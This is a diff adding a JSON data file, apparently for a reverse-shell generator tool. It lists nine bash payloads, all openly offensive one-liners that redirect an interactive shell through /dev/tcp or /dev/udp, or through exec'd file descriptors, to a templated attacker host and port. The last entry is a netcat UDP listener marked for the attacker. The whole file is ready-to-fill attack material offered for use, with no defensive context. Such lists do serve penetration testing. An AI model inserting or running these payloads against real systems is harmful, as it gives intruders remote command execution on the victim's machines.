@@ -1,0 +1,65 @@
+[
+  {
+    "type": "bash",
+    "direction": "reverse",
+    "payload": "/bin/bash -c '/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
+    "note": null,
+    "id": "bash1"
+  },
+  {
+    "type": "bash",
+    "direction": "reverse",
+    "payload": "/bin/bash -c '/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<&1 2>&1'",
+    "note": null,
+    "id": "bash2"
+  },
+  {
+    "type": "bash",
+    "direction": "reverse",
+    "payload": "/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<& 2>&1",
+    "note": null,
+    "id": "bash3"
+  },
+  {
+    "type": "bash",
+    "direction": "reverse",
+    "payload": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
+    "note": null,
+    "id": "bash4"
+  },
+  {
+    "type": "bash",
+    "direction": "reverse",
+    "payload": "exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
+    "note": null,
+    "id": "bash5"
+  },
+  {
+    "type": "bash",
+    "direction": "reverse",
+    "payload": "exec /bin/sh 0</dev/tcp/{LHOST}/{LPORT} 1>&0 2>&0",
+    "note": null,
+    "id": "bash6"
+  },
+  {
+    "type": "bash",
+    "direction": "reverse",
+    "payload": "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
+    "note": null,
+    "id": "bash7"
+  },
+  {
+    "type": "bash",
+    "direction": "reverse",
+    "payload": "bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
+    "note": "UDP",
+    "id": "bash8"
+  },
+  {
+    "type": "bash",
+    "direction": "reverse",
+    "payload": "nc -u -lvp {LPORT}",
+    "note": "UDP Listener (attacker)",
+    "id": "bash9"
+  }
+]
